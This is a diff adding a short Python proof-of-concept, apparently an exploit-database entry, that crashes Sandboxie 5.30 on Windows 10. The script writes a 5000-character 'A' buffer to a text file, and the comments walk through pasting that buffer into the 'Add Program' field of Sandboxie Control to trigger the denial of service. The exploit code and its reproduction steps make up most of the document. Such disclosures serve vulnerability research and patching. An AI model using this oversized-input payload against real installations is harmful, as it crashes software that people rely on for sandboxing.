@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: Sandboxie 5.30 - Denial of Service (PoC)
+# Date: 16/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://www.sandboxie.com
+# Software https://www.sandboxie.com/SandboxieInstall.exe
+# Version: 5.30
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script 'Sandboxie.py', it will create a new file 'Sandboxie.txt'
+# 2.- Copy the text from the generated Sandboxie.txt file to clipboard
+# 3.- Open Sandboxie Control
+# 4.- Go to 'Configure' > 'Programs Alerts'
+# 5.- Click 'Add Program', paste clipboard in the field 'Select or enter a program' and click 'OK'
+# 6.- Click 'OK' and crashed
+
+buffer = "\x41" * 5000
+
+f = open ("Sandboxie.txt", "w")
+f.write(buffer)
+f.close()
